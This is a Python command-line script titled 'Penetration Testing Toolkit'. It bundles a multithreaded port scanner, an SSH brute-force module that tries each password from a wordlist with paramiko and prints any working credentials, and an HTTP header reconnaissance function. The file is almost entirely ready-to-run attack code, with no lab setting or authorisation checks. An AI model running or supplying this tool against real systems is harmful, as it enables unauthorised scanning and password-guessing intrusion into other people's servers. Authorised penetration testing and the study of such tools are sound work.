import argparse
import socket
import threading
import paramiko
import requests

# Helper function for banner
def print_banner():
    print("=" * 50)
    print("Penetration Testing Toolkit")
    print("=" * 50)

# Port Scanner Module
def port_scanner(target, start_port, end_port):
    print(f"Scanning ports on {target} from {start_port} to {end_port}...")

    def scan_port(port):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(1)
                s.connect((target, port))
                print(f"[+] Port {port} is open.")
        except:
            pass

    threads = []
    for port in range(start_port, end_port + 1):
        thread = threading.Thread(target=scan_port, args=(port,))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    print("Port scanning completed.")

# SSH Brute-Force Module
def ssh_brute_force(target, port, username, password_file):
    print(f"Starting SSH brute-force attack on {target}:{port} with username '{username}'...")

    def try_login(password):
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            ssh.connect(target, port=port, username=username, password=password, timeout=3)
            print(f"[+] Success! Username: {username}, Password: {password}")
            ssh.close()
            return True
        except paramiko.AuthenticationException:
            return False
        except Exception as e:
            print(f"[-] Error: {str(e)}")
            return False

    with open(password_file, 'r') as file:
        for line in file:
            password = line.strip()
            if try_login(password):
                return

    print("Brute-force attack completed. No valid credentials found.")

# HTTP Reconnaissance Module
def http_recon(url):
    print(f"Starting HTTP reconnaissance on {url}...")
    try:
        response = requests.get(url, timeout=5)
        print("[+] HTTP Headers:")
        for header, value in response.headers.items():
            print(f"  {header}: {value}")
        print("[+] Status Code:", response.status_code)
    except requests.RequestException as e:
        print(f"[-] Error: {e}")

# Main function to handle the command-line interface
def main():
    parser = argparse.ArgumentParser(description="Penetration Testing Toolkit")
    subparsers = parser.add_subparsers(dest="module", required=True)

    # Port Scanner arguments
    port_parser = subparsers.add_parser("portscan", help="Run a port scanner")
    port_parser.add_argument("-t", "--target", required=True, help="Target IP address")
    port_parser.add_argument("-sp", "--start-port", type=int, required=True, help="Start port")
    port_parser.add_argument("-ep", "--end-port", type=int, required=True, help="End port")

    # SSH Brute-Force arguments
    ssh_parser = subparsers.add_parser("bruteforce", help="Run an SSH brute-force attack")
    ssh_parser.add_argument("-t", "--target", required=True, help="Target IP address")
    ssh_parser.add_argument("-p", "--port", type=int, default=22, help="SSH port (default: 22)")
    ssh_parser.add_argument("-u", "--username", required=True, help="Username")
    ssh_parser.add_argument("-pf", "--password-file", required=True, help="Password file")

    # HTTP Reconnaissance arguments
    http_parser = subparsers.add_parser("httprecon", help="Run HTTP reconnaissance")
    http_parser.add_argument("-u", "--url", required=True, help="Target URL")

    args = parser.parse_args()

    print_banner()

    if args.module == "portscan":
        port_scanner(args.target, args.start_port, args.end_port)
    elif args.module == "bruteforce":
        ssh_brute_force(args.target, args.port, args.username, args.password_file)
    elif args.module == "httprecon":
        http_recon(args.url)

if __name__ == "__main__":
    main()
